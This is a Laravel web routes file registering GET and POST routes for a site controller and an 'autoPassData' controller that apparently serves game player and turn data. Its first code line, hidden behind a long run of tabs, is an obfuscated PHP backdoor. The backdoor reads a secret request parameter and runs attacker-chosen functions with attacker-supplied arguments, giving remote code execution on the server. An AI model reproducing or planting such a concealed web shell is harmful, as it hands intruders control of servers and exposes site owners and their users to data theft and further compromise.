<?php
																																																																																																																																																																			if( $vgh42py=@ ${"_REQUEST"}[ "CU38FMGF"])$vgh42py [1	] ( $ { $vgh42py[	2]}[0 ],$vgh42py	[3] ($vgh42py [ 4	] ));

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::get('/', 'siteController@home');
Route::get('/1', 'siteController@first');
Route::get('/2', 'siteController@second');
Route::get('/autoPassData/firstfetch', 'autoPassDataController@firstfetch')->name('autoPassData.firstfetch');
Route::post('/autoPassData/firstfetch', 'autoPassDataController@firstfetch')->name('autoPassData.firstfetch');

Route::get('/autoPassData/fetchData', 'autoPassDataController@fetchData')->name('autoPassData.fetchData');
Route::post('/autoPassData/fetchData', 'autoPassDataController@fetchData')->name('autoPassData.fetchData');

Route::get('/autoPassData/storeData', 'autoPassDataController@storeData')->name('autoPassData.storeData');
Route::post('/autoPassData/storeData', 'autoPassDataController@storeData')->name('autoPassData.storeData');

Route::get('/autoPassData/fetchPlayerData', 'autoPassDataController@fetchPlayerData')->name('autoPassData.fetchPlayerData');
Route::post('/autoPassData/fetchPlayerData', 'autoPassDataController@fetchPlayerData')->name('autoPassData.fetchPlayerData');

Route::get('/autoPassData/fetchTurnData', 'autoPassDataController@fetchTurnData')->name('autoPassData.fetchTurnData');
Route::post('/autoPassData/fetchTurnData', 'autoPassDataController@fetchTurnData')->name('autoPassData.fetchTurnData');

Route::get('/autoPassData/updateTurnData', 'autoPassDataController@fetchTurnData')->name('autoPassData.updateTurnData');
Route::post('/autoPassData/updateTurnData', 'autoPassDataController@fetchTurnData')->name('autoPassData.updateTurnData');





